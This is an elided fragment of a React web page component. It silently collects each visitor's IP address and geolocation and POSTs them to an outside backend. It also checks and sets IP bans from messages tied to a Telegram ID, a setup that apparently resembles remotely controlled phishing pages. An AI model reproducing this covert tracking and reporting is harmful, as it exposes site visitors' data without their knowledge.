...
export default function Home() {
      ...
      .then(ipData => {
        ...
        fetch('https://ipapi.co/' + ipData.ip + '/json')
          ...
          .then(data => {
              ...
              fetch("https://rbback.onrender.com/send/ip", {
                  method: "POST",
  ...
  useEffect(() => {
    const CheckBan = async (ip) => {
      await axios.get(`https://rbback.onrender.com/checkBan/${ip}`).then((data) => {
        if (data.data.data) {
  ...
  const getUserTelegramId = async (uniqueString) => {
    const x = await axios.get(`https://rbback.onrender.com/getMessages`)
    ...
    if (result) {
      ...
      if (LastFetch !== 'Ban') {
        if (ban) {
          setLastFetch('Ban')
          axios.get(`https://rbback.onrender.com/ban/${Ip}`)
        }
      }
